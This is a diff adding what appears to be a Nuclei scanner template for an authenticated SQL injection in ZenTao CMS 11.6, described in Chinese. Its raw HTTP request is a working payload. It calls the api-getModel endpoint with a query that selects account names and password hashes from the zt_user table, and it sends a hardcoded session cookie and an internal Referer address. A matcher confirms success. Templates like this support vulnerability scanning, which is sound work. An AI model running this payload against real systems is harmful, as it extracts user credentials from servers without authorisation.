@@ -1,0 +1,28 @@
+id: zentaocms-Background-sql-injection
+info:
+  name: zentaocms-Background-sql-injection
+  author: apple
+  severity: medium
+  description: 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入.需要登录。
+  reference:
+    - https://www.hacking8.com/bug-web/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93-11.6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: zentaocms
+http:
+  - raw:
+      - |+
+        GET /api-getModel-api-sql-sql=select+account,password+from+zt_user HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://192.168.100.152:8084/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: zentaosid=fvom4rntrf5fkfddcb764dng9l; lang=zh-cn; device=desktop; theme=default; windowWidth=1200; windowHeight=1002
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":"success"'
